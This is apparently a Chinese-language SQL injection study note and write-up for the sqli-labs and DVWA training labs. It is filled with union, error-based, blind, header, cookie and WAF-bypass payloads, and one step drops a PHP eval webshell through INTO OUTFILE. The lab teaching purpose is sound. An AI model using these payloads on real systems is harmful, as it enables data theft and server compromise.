基于错误的注入
```
' or 1=1 in (select @@version) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

基于时间的盲注
```
qwe' AND IF (1=1, sleep(3),'false') -- //
```




* * * *

1.先查找注入点 

```mysql
http://localhost/sqli-labs-master/less-1/?id=1 -- -
```

2.判断注入形式
数字型：

```mysql
http://localhost/sqli-labs-master/less-1/?id=1 and 1=1 -- -
http://localhost/sqli-labs-master/less-1/?id=1 and 1=2 -- -
```

如果都可以正常显示那就不是数字型注入 反之 因为1=1和1=2会被运算 如果是字符型那就不会被运算.

3.判断闭合方式
如果是字符型注入 那就一定有闭合方式闭合前面的(引号),常见的闭合方式有以下四种

```mysql
http://localhost/sqli-labs-master/less-1/?id=1' -- -
```

```mysql
http://localhost/sqli-labs-master/less-1/?id=1" -- -
```

```mysql
http://localhost/sqli-labs-master/less-1/?id=1') -- -
```

```mysql
http://localhost/sqli-labs-master/less-1/?id=1") -- -
```

4.查询回显列数 

```mysql
http://localhost/sqli-labs-master/less-1/?id=1' group by 3 -- - / order by 3 
```

这里group by和order by 是差不多的原理 判断出回显列数为后面的注入拿信息
这里还是推荐使用group by 因为基本上绝大多数waf都会过滤order by 但是有一些不会过滤group by

5.查询回显位置

```mysql
http://localhost/sqli-labs-master/less-1/?id=-1' union select 1,2,3 -- -
```

改id值 -1或者0 使得有位置给我们的联合查询回显数据

6.开始手工注入

------

## **MYSQL文件上传注入：**

(UDF)
```mysql
show variables like '%secure%'; 
用来查看mysql是否有读写文件权限
```

------

## DVWA -sql 注入靶场

#### [SQL Injection](http://127.0.0.1/dvwa-master/vulnerabilities/sqli/)
##### LOW
```php
// Get input
$id = $_REQUEST[ 'id' ];
// Check database
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

输入参数可控，传入到 SQL 查询语句中，单引号闭合，产生了 SQL 注入漏洞，**例：**

```sql
$id = '1' select database() #'
```

其中 `1' select database() #` 是我们输入的参数，当这个参数传输到下面的查询语句中后，就变成了

```sql
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '1' select database() #';";
```

`user_id = '1'` 被闭合了，导致后面的字符串  `select database()`  变成了 sql 语句执行 , 最后 `#` 注释掉了后面多余的语句，所以 `select database()` 就会被执行

但是，列数不一致会导致 SQL 语句报错，所以我们首先要确定有多少列：

```
' order by 2 #
```

order by 是常见的根据列来排序的一个命令，当我们修改成 `' order by 3 #` 的时候出现了报错，这就说明只有两列，重新构造语句

```
ID: ' union select 1,2 #  
First name: 1  
Surname: 2
```

看到回显位置后，继续构造我们的语句

```
ID: ' union select @@version,database() #  
First name: 5.7.26  
Surname: dvwa
```

看到版本是5.7.26 , 数据库名字是 dvwa , 已经可以证实存在 sql 漏洞


##### Medium

```php
$id = $_POST[ 'id' ];
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

```
mysqli_real_escape_string 函数：对于特殊字符转义，但是不会过滤 or and 这类字符
$GLOBALS["___mysqli_ston"] ： 表示全局 MySQL 数据库连接对象
```

看到没有单引号，那就应该是数字型注入，尝试一下

```
id=0 or 1=1 #&Submit=Submit

ID: 0 or 1=1 #  
First name: admin  
Surname: admin

ID: 0 or 1=1 #  
First name: Gordon  
Surname: Brown

ID: 0 or 1=1 #  
First name: Hack  
Surname: Me

ID: 0 or 1=1 #  
First name: Pablo  
Surname: Picasso

ID: 0 or 1=1 #  
First name: Bob  
Surname: Smith
```

```
ID: 0 union select @@version,database() #  
First name: 5.7.26  
Surname: dvwa
```

看到成功回显，证实存在 sql 注入漏洞，在后面枚举数据的时候要注意吧单引号内的数据换成 **Hex (16进制)** 编码。


##### HARD

```php
    $id = $_SESSION[ 'id' ];
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );
```

看到没有做任何过滤，只有 LIMIT 1 , 做了一些限制但是也可以直接注释掉，尝试注入一下

```
ID: ' union select @@version,database() #  
First name: 5.7.26  
Surname: dvwa
```

看到也可以成功注入


#### [SQL Injection (Blind)](http://127.0.0.1/dvwa-master/vulnerabilities/sqli_blind/)

##### Low

```php
    $id = $_GET[ 'id' ];
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); 
    $num = @mysqli_num_rows( $result ); 
```

使用@压制住了 MySQL 的错误

```
' or 1=1 # 
User ID exists in the database.

' or 1=2 # 
User ID is MISSING from the database.
```

发现只会回显这两个提示，那就存在布尔盲注

```sql
' or length(database())>3 #
User ID exists in the database.

' or length(database())>4 #
User ID is MISSING from the database.
```




* * * *

## Sqli靶场 实战 wp

## less-1

通过判断是一个简单的GET字符型单引号闭合注入，直接判断列数为3列，回显位置2,3 进行联合查询

```mysql
http://localhost/sqli-labs-master/less-1/?id=-1' union select 1,@@version,group_concat(table_name) from information_schema.tables where table_schema=database() -- -
```

回显：Your Login name:5.7.26
Your Password:emails,referers,uagents,users
继续爆列名

```mysql
http://localhost/sqli-labs-master/less-1/?id=-1' union select 1,@@version,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' -- -
```

回显：Your Login name:5.7.26
Your Password:id,username,password
拿到密码:

```mysql
http://localhost/sqli-labs-master/less-1/?id=-1' union select 1,@@version,group_concat(username,password) from users -- -
```

------

## less-2

找到注入点 注入方式是基于GET的数字型注入
判断列数为三行 开始注入

```mysql
http://localhost/sqli-labs-master/less-2/?id=-1 union select 1,@@version,group_concat(table_name)from information_schema.tables where table_schema=database() -- -
```

回显：Your Login name:5.7.26
Your Password:emails,referers,uagents,users

```mysql
http://localhost/sqli-labs-master/less-2/?id=-1 union select 1,@@version,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users' -- -
```

回显：  Your Login name:5.7.26
Your Password:id,username,password  

```mysql
http://localhost/sqli-labs-master/less-2/?id=-1 union select 1,@@version,group_concat(username,password) from users -- - 拿到数据
```

------

## less-3

判断闭合方式 是GET型的 字符型注入 闭合符号是 ') 

```mysql
http://localhost/sqli-labs-master/less-3/?id=-1') union select 1,@@version,group_concat(table_name) from information_schema.tables where table_schema=database() -- -

http://localhost/sqli-labs-master/less-3/?id=-1') union select 1,@@version,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --  -

http://localhost/sqli-labs-master/less-3/?id=-1') union select 1,@@version,group_concat(username,password) from users -- -

```

------

## less-4

基于GET型的字符型注入 闭合方式  ")  其他与less-3同理

------

## less-5

基于GET型的报错注入 闭合方式 '

```mysql
http://localhost/sqli-labs-master/less-5/?id=100' union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) -- -
```

回显：XPATH syntax error: '~emails,referers,uagents,users'

```mysql
http://localhost/sqli-labs-master/less-5/?id=100' union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) -- -
```

回显：  XPATH syntax error: '~id,username,password'

```mysql
http://localhost/sqli-labs-master/less-5/?id=100' union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(username,password) from users),31,30))) -- -
```

利用substring()函数来控制回显字符数 得到数据

------

基于GET型的updatexml()报错注入:

```mysql
http://localhost/sqli-labs-master/less-5/?id=100' and 1=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) -- - 
```

爆出来表名 回显：  XPATH syntax error: '~emails,referers,uagents,users'  继续爆列

```mysql
http://localhost/sqli-labs-master/less-5/?id=100' and 1=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),3) -- - 
```

回显：XPATH syntax error: '~id,username,password' 继续爆数据

```mysql
http://localhost/sqli-labs-master/less-5/?id=100' and 1=updatexml(1,concat(0x7e,(select substring(group_concat(username,password),1,30) from users)),3) -- - 
```

**注意：**使用substring()函数来控制输出的字符总数不超过32个字符 因为基于updatexml的报错注入最多只允许单次输出32字符的数据 
**substring()的使用：**substring(1,2,3)   ->   substring(要查询的数据,开始查询的第n个字符,向后查询n个字符)

------

基于GET型的floor()报错注入：

```mysql
http://localhost/sqli-labs-master/less-5/?id=1' union select 1,count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as x from information_schema.tables group by x -- -
```

回显：  Duplicate entry 'emails,referers,uagents,users-1' for key ''    继续修改代码进一步爆列

```mysql
http://localhost/sqli-labs-master/less-5/?id=1' union select 1,count(*),concat_ws('-',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),floor(rand(0)*2)) as x from information_schema.tables group by x -- -
```

回显：Duplicate entry 'id,username,password-1' for key ''   爆数据

```mysql
http://localhost/sqli-labs-master/less-5/?id=1' union select 1,count(*),concat_ws('-',(select concat(username,':',password) from users limit 1,1),floor(rand(0)*2)) as x from information_schema.tables group by x -- -
```

得到username 和 password

**注意:** 这边要把group_concat()改成concat() , 然后后面链接limit()函数 控制输出的行数 因为floor()报错注入最多只支持64字符的输出 是extractvalue和updatexml的两倍

------

## less-6

基于GET型的字符型报错注入 闭合方式 " 

```mysql
利用extractvalue的报错注入
http://localhost/sqli-labs-master/less-6/?id=1" and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) -- -
```

回显：XPATH syntax error: '~emails,referers,uagents,users'

```mysql
爆列名
http://localhost/sqli-labs-master/less-6/?id=1" and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) -- -
```

回显：XPATH syntax error: '~id,username,password'

```mysql
最后爆数据
http://localhost/sqli-labs-master/less-6/?id=1" and 1=extractvalue(1,concat(0x7e,substr((select group_concat(username,':',password) from users),1,30))) -- -
```

------

## less-7(导出文件GET型注入)(了解*)

注意 满足该注入需要三个条件:
1.具有root权限
2.在数据库配置文件中的 配置项含有：secure_file_priv=''（注意在数据库中此项默认为secure_file_priv=null）
3.知道数据库的绝对路径
**注意：由于满足条件十分苛刻，所以很难实现所以这里的注入只作为了解** 

明确告诉我们是文件上传注入 先找闭合点是 ')) 这个闭合点不太好找 

```mysql
?id=1')) and if(1=2,sleep(0),sleep(2)) -- -
```

**如果?id=1'))闭合正确 那么后面的语句就会被执行 1=2 返回假 执行休眠2秒 其他的闭合方式都不执行**

```mysql
也可以用1=1和1=2来判断报错有没有闭合成功:
?id=1')) and 1=1 -- -
?id=1')) and 1=2 -- -
```

判断列数为三列,编写一句话木马

```mysql
这里可以偷个懒使用 @@datadir 查看目录位置作为一句话木马上传地址
http://localhost/sqli-labs-master/less-1/?id=-1' union select 1,2,@@datadir -- -
```

Your Password:K:\PHPSTUDY\phpstudy_pro\Extensions\MySQL5.7.26\data\

```mysql
http://localhost/sqli-labs-master/less-7/?id=1')) union select 1,2,"<?php @eval($_POST['what']); ?>" into outfile "K:\\PHPSTUDY\\phpstudy_pro\\WWW\\sqli-labs-master\\flag.php" -- -
```

注意这里的路径斜杠全都用 两个\   
路径为靶场的目录，into outfile 导出文件 然后通过中国蚁剑拿到shell

------

## less-8 (布尔盲注)

基于GET型的布尔盲注 闭合方式 '

```mysql
http://localhost/sqli-labs-master/less-8/?id=1' and 1=1 -- -   （注意前面要闭合）
```

回显：You are in...........

```mysql
http://localhost/sqli-labs-master/less-8/?id=1' and 1=2 -- -   （注意前面要闭合）
```

回显：
不同的值返回不同的页面 1=1真值回显 1=2假值不回显 
**基于布尔类型的盲注**
一般来说都是用SQLMAP来自动注入 但是基本上都是先通过手工布尔盲注找到绕过WAF的方法然后再借助sqlmap爆破
**关键函数**：
ascii():可以使用这个函数把查询到的内容转换为数字，以真假页面来判断字母和ascii对应的数字是否正确

```mysql
?id=1' and ascii('e')=101 -- -  条件满足，页面返回为真
?id=1' and ascii('e')=102 -- -  条件不满足，页面返回为假
```

substr((),1,1):指定控制每次输出的字符 

```mysql
?id=1' and ascii(substr(database(),1,1))>100 -- -
利用?id=1' and ascii(substr(database(),1,1))>? -- - 来穷举出字符的ascii码
?id=1' and ascii(substr(database(),1,1))=115 -- -   判断database()的第一个字符的acsii码是115 
?id=1' and ascii(substr(database(),2,1))=101 -- -   第二个字符的acsii码是101
......
```


**模板：**

```mysql
?id=1' and acsii(substr('注入代码',1,1))>97 -- -
例：?id=1' and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)>100 -- -
```

​	此处没必要用 group_concat() 函数，而是使用 **limit 0,1**
​	从第0行开始显示1行， 从结果的第一行数据依次查询

------

## less-9 (时间盲注 )

基于GET型的时间盲注 闭合方式 '

###### **前提**：没有回显 没有报错 可以被数据库执行

**闭合方式判断**：

```mysql
?id=1 and sleep(2) -- -
?id=1' and sleep(2) -- -
?id=1" and sleep(2) -- -
?id=1') and sleep(2) -- -
?id=1") and sleep(2) -- -
sleep(2)可以执行就是闭合符正确
```

###### **函数**： 

sleep(2)  休眠2秒
if( 1=2 , sleep(0) , sleep(3) ) 解析：1=2 为真 ，执行 sleep(0) 语句 ； 为假 ，执行 sleep(3) 

```mysql
?id=1' and if(ascii(substr((select database()),1,1))>=115,sleep(0),sleep(3)) -- -
```

对database()的第一个字符进行猜测 如果ascii != 115 则休眠3秒 , 如果 = 115 直接刷新 ; 更改substr参数猜出后面的字符

```mysql
?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>=101,sleep(0),sleep(3)) -- -
```

推测出第一行表的第一个字符的ascii为101 以此类推爆出字段、username、password...

------

## less-10（时间盲注）

基于GET型的时间盲注 闭合方式 "

```mysql
?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))>=115,sleep(0),sleep(3)) -- -
```

以此类推 与less-9同理 不多赘述

------

------

## POST提交注入:

get提交会被缓存 post不会
get提交会被保存在浏览器的历史记录里 post不会
get提交可以保存为书签 post不会
get提交有长度限制为2048个字符 post没有长度要求 可以使用ASCII和二进制字符
**post提交比get提交更安全**

## POST找闭合方式技巧：

POST注入中 可以如果和万能密码有关 可以通过

```mysql
=qwe" or if(1=2,sleep(0),sleep(3)) -- -                                                      (less-14)
```

(修改闭合方式 如果sleep(3)了 那就是该闭合方式)
可以快速找到闭合方式 进行下一步SQL注入

------

------

## less-11:

利用burp suite抓post包 拿到post请求模板 利用hackbar修改post的值 用万能密码进行尝试

### 注意：这里的Submit的S一定要大写！！

```mysql
uname=qwe' or 1=1 -- -&passwd=123&Submit=Submit 发现存在sql注入
```

```mysql
判断列数     uname=qwe' order by 4 -- -&passwd=123&Submit=Submit 
回显:        Unknown column '4' in 'order clause'
继续尝试     uname=qwe' order by 2 -- -&passwd=123&Submit=Submit
无回显 判断列数只有2列
```

```mysql
uname=qwe' union select 1,2 -- -&passwd=123&Submit=Submit
可以正常回显
```

回显:Your Login name:1
Your Password:2

开始构造SQL注入语句,和GET型注入差不多

```mysql
uname=qwe' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -- -&passwd=123&Submit=Submit
回显：
Your Login name:1
Your Password:emails,referers,uagents,users
```

继续构造语句爆出username,password

```mysql
uname=qwe' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' -- -&passwd=123&Submit=Submit
回显:
Your Login name:1
Your Password:id,username,password
```

```mysql
uname=qwe' union select 1,group_concat(username,password) from users -- -&passwd=123&Submit=Submit
回显：
Your Login name:1
Your Password:DumbDumb,AngelinaI-kill-you,Dummyp@ssword,securecrappy,stupidstupidity,supermangenious,batmanmob!le,adminadmin,admin1admin1,admin2admin2,admin3admin3,dhakkandumbo,admin4admin4
```

------

## less-12

基于POST型的字符型注入 闭合方式 ") 

```mysql
其他与less-11一模一样 不做wp了
uname=qwe") union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'-- -&passwd=123&Submit=Submit
```

------

## less-13

基于POST型的报错注入（真值无回显，假值报错） 闭合方式 ')

```mysql
uname=qwe') or 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) -- - &passwd=123&Submit=Submit
或者
uname=qwe') union select count(*),concat_ws('-',(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),floor(rand(0)*2)) as x from information_schema.columns group by x -- -&passwd=123&Submit=Submit &passwd=123&Submit=Submit
```

**如果这里出现 Subquery returns more than 1 row  报错 检查是否使用limit()函数**

```mysql
uname=qwe') union select count(*),concat_ws('-',(select username from users limit 0,1),floor(rand(0)*2)) as x from information_schema.columns group by x -- -&passwd=123&Submit=Submit &passwd=123&Submit=Submit
uname=qwe') union select count(*),concat_ws('-',(select password from users limit 0,1),floor(rand(0)*2)) as x from information_schema.columns group by x -- -&passwd=123&Submit=Submit &passwd=123&Submit=Submit
获取username,password
```

------

## less-14

基于POST型的报错注入 闭合方式 " 
其余的和 **less-13** 同理

```mysql
uname=qwe" union select count(*),concat_ws('-',(select password from users limit 0,1),floor(rand(0)*2)) as x from information_schema.columns group by x -- -&passwd=123&Submit=Submit &passwd=123&Submit=Submit 
```

------

## less-15

基于POST型的布尔盲注(时间盲注) 闭合方式 '

```mysql
uname=qwe' or ascii(substring((select database()),1,1))>=115 -- -&passwd=admin&Submit=Submit
```

------

## less-16

基于POST型的布尔盲注(时间盲注) 闭合方式 ")

```mysql
uname=qwe") or if(1=2,sleep(0),sleep(2))-- -&passwd=admin&Submit=Submit                  (判断闭合方式)
```

```mysql
uname=qwe") or ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))>=101 -- - &passwd=admin&Submit=Submit
```

**注意：布尔盲注在查表、字段、数据的时候不光要加上substring() 还要加上limit()控制行数 不然一直返回为假！**

------

## less-17

基于POST型的报错注入,闭合方式 password中的'           （提示框提示了[PASSWORD RESET]  应当把重点放在password的输入中）

```mysql
uname=admin&passwd=' or if(1=2,sleep(0),sleep(3)) -- -&Submit=Submit                   (判断闭合方式)
```

使用updatexml进行报错注入

```mysql
uname=admin&passwd=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) -- -&Submit=Submit
```

```mysql
uname=admin&passwd=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),1) -- -&Submit=Submit
```

回显:XPATH syntax error: '~id,email_id,id,referer,ip_addre'

**爆数据的payload暂时不做 不会~**          （涉及到双select）

------

## less-18

Head头部的**uagent**注入 新的题型 先进行源php的代码审计：  (详细聊)

```php
include("../sql-connections/sql-connect.php");    //文件包含 链接到mysql数据库
```

```php
if(!empty($value))
		{
		// truncation (see comments)
		$value = substr($value,0,20);               //只检测长度0-20的字符
		} 
		if (get_magic_quotes_gpc())                 //空格 分号 中间的空格全部用斜杠替代
			{
			$value = stripslashes($value);          //不使用斜杠替代 这句话的意思是如果php版本开了这个功能 那就给它关掉
			}
		if (!ctype_digit($value))              		//如果value的值不是纯数字 
			{
			$value = "'" . mysql_real_escape_string($value) . "'";       
			}		
else
		{
		$value = intval($value);                     //intval() 函数通过使用指定的进制 base 转换（默认是十进制）
		}
	return $value;
	}
```

```php
(重点代码)
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
//这里的VALUES ('$uagent', '$IP', $uname)";没有做安全审查 从而可以被利用 可能存在sql注入的漏洞 进行尝试
```

**闭合方式分析：** 
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) **VALUES ('$uagent', '$IP', $uname)";**
先输入一个' 闭合 '$uagent' 中前面的' 使得中间有空间给我们插入非法sql代码 ， 必须传入三个参数 这边用1,2,3 然后输入 # 注释后面的所有语句

**注意：** value是用（）括起来的 后面的）被 # 注释掉了 所以后面必须补上一个） 
最后 闭合后的uagent为：

```mysql
SQL增查改语句 >> INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (1,2,3);  
SQL注入攻击语句 >> User-Agent:' or 1,2,3) #
```

**开始注入：**
(这里可以利用burp suite的repeater来注入)

```mysql
User-Agent:' or updatexml(1,concat(0x7e,(select database())),1),2,3) #
回显: XPATH syntax error: '~security'
```

```mysql
User-Agent:' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1),2,3) #
回显: XPATH syntax error: '~emails,referers,uagents,users'
```

```mysql
User-Agent:' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)),1),2,3) #
回显: XPATH syntax error: '~id,username,password'
```

最后一步 爆数据:

```mysql
User-Agent:' or updatexml(1,concat(0x7e,(select group_concat(username,':',password) from users limit 0,1)),1),2,3) #
回显: XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'
修改limit的值依次类推 ... (拿到数据)
```

------

## less-19

输入admin和admin 回显：
Your IP ADDRESS is: 127.0.0.1
Your Referer is: http://localhost/sqli-labs-master/less-19/?id=1
那这里就要想到是不是和Referer有关了 和uagent同理 

------

## less-20

头部cookie注入 注入点是uname后调用查询数据库的地方

```mysql
Cookie: uname=' union select 1,2,(select group_concat(username,'-',password) from users )#
```

------

## less-21

头部cookie注入 是base64型的注入
登录admin admin 回显：uname= YWRtaW4=  很明显 是经过base64编码了 找到闭合方式为 ') 判断列数为3 开始注入

```mysql
Cookie: uname=') union select 1,2,database() #
Cookie: uname=JykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpICM=
回显:>Your Password:security</font></b><br>Your ID:1
```

```mysql
Cookie: uname:') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
Cookie: uname=JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpICM=
回显:Your Login name:2<br><font color= "grey" font size="5">Your Password:emails,referers,uagents,users</font></b><br>Your ID:1
```

```mysql
Cookie: uname:') union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' #
Cookie: uname=JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkgYW5kIHRhYmxlX25hbWU9J3VzZXJzJyAj
回显:Your Password:id,username,password
```

最后爆数据

------

## less-22

基于头部cookie的注入 闭合方式" base64加密 （为了方便 下面的payload全都用明文显示）

```mysql
" or 1=1#
" or 1=2#
找到闭合方式
```

```mysql
" order by 3 #
判断列数为3列
```

直接爆

```mysql
" union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' #
...
```

------

## less-23

```mysql
http://localhost/sqli-labs-master/less-23/?id=1' -- -
```

**回显:**

```text
**Warning**:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in **K:\PHPSTUDY\phpstudy_pro\WWW\sqli-labs-master\Less-23\index.php** on line **38**
 You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near '' LIMIT 0,1' at line 1 
```

**代码审计:**

```php
$reg = "/#/";                          
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
//下面两个函数的意义是 检测是否有 # -- 这两个字符 如果有 则replace成空 给变量id 
//所以可以审到是对我们的闭合做了一些手段阻拦了 这个类型我们称为WAF (web端防火墙)
```

```php
//sql执行语句
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
```

尝试闭合id='$id':

```mysql
?id=-1' union select 1,2,3 or '1'='1
解析(从左往右): -1拿到回显位置 '闭合前面第一个引号 or前面写语句 '1'单独作为一个数和后面的1作比较返回为真 因为是or所以这个语句永远为真 '和后面的引号闭合 使得'1 变成了'1' 和前面的'1'对比 所以构造后完整的语句为
$sql="SELECT * FROM users WHERE id='-1' union select 1,2,3 or '1'='1 ' LIMIT 0,1";

闭合方式' " ') ")都可以用这种方法来进行闭合绕过WAF
```

开始注入:

```mysql
http://localhost/sqli-labs-master/less-23/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),3 or '1'='1
回显:Your Login name:id,username,password
```

```mysql
http://localhost/sqli-labs-master/less-23/?id=-1' union select 1,(select group_concat(username,password) from users),3 or '1'='1
回显:Your Login name:DumbDumb,AngelinaI-kill-you,Dummyp@ssword,securecrappy,stupidstupidity,supermangenious,batmanmob!le,adminadmin,admin1admin1,admin2admin2,admin3admin3,dhakkandumbo,admin4admin4
```

------

------

## less-25

and和or的绕过:
**总结方法**
1.复写: anandd  AnAnDd
2.利用|| 和 && 要用URL编码



## 关于less-25的补充

**绕过WAF逗号过滤解决方法:**
JOIN:

```mysql
?id=-1' union select * from (select 1)a join (select 2)b join (select 3)c -- -
```

Your Login name:2
Your Password:3`

```mysql
?id=-1' union select * from (select 1)a join (select 2)b join (select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())c -- -
##注意复写or 因为是less-25     获得表名
```

```mysql
?id=-1' union select * from (select 1)a join (select 2)b join (select group_concat(column_name) from infoorrmation_schema.columns where table_schema=database() anandd table_name='users')c -- -
```

 Your Login name:2
Your Password:id,username,password

```mysql
?id=-1' union select * from (select 1)a join (select group_concat(username) from users)b join (select group_concat(passwoorrd) from users)c -- -
```

Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 

------

## less-26

空格绕过  总结 利用%A0进行绕过 后面的注释使用or '1'='1 进行闭合      !!  === **%0A也可以**=== !!

**注意：**在win中的phpstudy sqli的%A0不会被当做空格 所以win端的%A0绕过空格不行 可以使用报错注入:

```mysql
?id=100'||extractvalue(1,concat('$',(database())))||'1'='1
```

这一步没什么问题 注意了 下面一步进行爆表名的时候 因为不能用空格 所以可以多加括号的形式来绕过

```mysql
?id=100'||extractvalue(1,concat('$',(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))))||'1'='1
```

**注意：**这边的information中的 or 会被WAF过滤 所以要复写变成infoorrmation 单词之间的空格用（）代替 爆字段也是同理

```mysql
?id=100'||extractvalue(1,concat('$',(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())anandd(table_name='users'))))||'1'='1
回显:Unknown XPATH variable at: '$id,username,password' 
```

爆数据

```mysql
?id=100'||extractvalue(1,concat('$',(select(group_concat(username,passwoorrd))from(users))))||'1'='1
```

**注意：**这边的password 中的 or 会被WAF过滤 需要复写成passwoorrd 完成

------

## less-27

union select的WAF绕过 闭合方式'

```mysql
?id=-1'%0Aunion%0Aselect%0A1,2,3%0Aor%0A'1'='1
Hint: Your Input is Filtered with following result: 1' 1,2,3 or '1'='1
```

发现union 和 select 都没了 判断是WAF把两个关键字给替换了 尝试绕过:

**使用注释符绕过**

```mysql
?id=-1'%0Aun/**/ion%0Aselect%0A1,2,3%0Aor%0A'1'='1
Hint: Your Input is Filtered with following result: 1' 1,2,3 or '1'='1
-- 发现不起作用
```

**使用大小写绕过**

```mysql
?id=-1'%0AuNion%0AsElect%0A1,2,3%0Aor%0A'1'='1
Hint: Your Input is Filtered with following result: 1' uNion sElect 1,2,3 or '1'='1
Your Login name:Dumb
Your Password:Dumb
-- 可以使用大小写绕过
```

**使用复写绕过**

```mysql
?id=-1'%0Aununionion%0AseleSelectct%0A1,2,3%0Aor%0A'1'='1
Hint: Your Input is Filtered with following result: 1' union select 1,2,3 or '1'='1
Your Login name:Dumb
Your Password:Dumb
-- 可以使用复写绕过
```

------

## 宽字节绕过

只适用于**GBK**编码的数据库
结论：闭合单引号前加 %df 即可

------

